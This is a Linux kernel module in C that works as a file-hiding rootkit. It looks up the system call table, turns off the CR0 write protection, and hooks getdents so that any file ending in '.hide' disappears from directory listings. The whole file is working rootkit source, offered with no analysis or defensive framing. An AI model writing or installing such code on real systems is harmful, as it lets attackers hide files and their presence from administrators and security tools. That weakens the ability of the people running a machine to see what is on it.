#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>

MODULE_LICENSE("GPL");

#define HIDE_EXT ".hide"
#define EXT_LEN (sizeof(HIDE_EXT) - 1)
#define DIRENT_PART_SIZE (2* sizeof(unsigned long) + sizeof(unsigned short)) // size of the first 3 linux_dirent fields

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

unsigned long *sys_call_table = NULL;
asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent *, unsigned int);

inline void disable_write_protect(void) {
    write_cr0(read_cr0() & (~0x10000));
}

inline void enable_write_protect(void) {
    write_cr0(read_cr0() | 0x10000);
}

asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    struct linux_dirent *filtered_dirp, *temp_dirp;
    size_t name_len;
    int bytes_read, remaining_bytes;

    bytes_read = original_getdents(fd, dirp, count);
    if (bytes_read <= 0) {
        return bytes_read;
    }

    filtered_dirp = dirp;           // Points to the last element of filtered part
    temp_dirp = dirp;               // Used as iterator to go through all dirp elements
    remaining_bytes = bytes_read;
    while (remaining_bytes > 0) {
        if (temp_dirp->d_reclen <= 0) {
            printk(KERN_ALERT "linux_dirent struct bad size: %hu", temp_dirp->d_reclen);
            break;
        }

        name_len = strnlen(temp_dirp->d_name, temp_dirp->d_reclen - DIRENT_PART_SIZE);
        if (strcmp(HIDE_EXT, temp_dirp->d_name + name_len - EXT_LEN) == 0) {
            bytes_read -= temp_dirp->d_reclen;
        } else {
            if (filtered_dirp != temp_dirp) {
                memcpy(filtered_dirp, temp_dirp, temp_dirp->d_reclen);
            }
            filtered_dirp = (struct linux_dirent *) ((char *) filtered_dirp + filtered_dirp->d_reclen);
        }
        remaining_bytes -= temp_dirp->d_reclen;
        temp_dirp = (struct linux_dirent *) ((char *) temp_dirp + temp_dirp->d_reclen);
    }

    return bytes_read;
}

static int __init hide_files_init(void) {
    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
    original_getdents = (void *) sys_call_table[__NR_getdents];
    disable_write_protect();
    sys_call_table[__NR_getdents] = (unsigned long) getdents_hook;
    enable_write_protect();
    return 0;
}

static void __exit hide_files_exit(void) {
    disable_write_protect();
    sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
    enable_write_protect();
}

module_init(hide_files_init);
module_exit(hide_files_exit);
